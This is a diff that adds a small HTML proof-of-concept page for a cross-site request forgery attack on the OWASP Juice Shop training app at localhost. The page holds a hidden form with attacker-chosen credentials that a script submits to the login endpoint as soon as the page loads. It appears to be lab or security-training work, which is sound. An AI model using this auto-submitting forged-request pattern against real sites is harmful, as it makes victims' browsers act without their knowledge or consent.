@@ -1,1 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Proof of Concept</title>
+</head>
+<body>
+
+<h2>CSRF PoC – OWASP Juice Shop</h2>
+
+<p>If the victim is authenticated, this request will be executed automatically.</p>
+
+<form action="http://localhost:3000/rest/user/login" method="POST">
+    <input type="hidden" name="email" value="attacker@test.com">
+    <input type="hidden" name="password" value="attacker123">
+</form>
+
+<script>
+    document.forms[0].submit();
+</script>
+
+</body>
+</html>
 
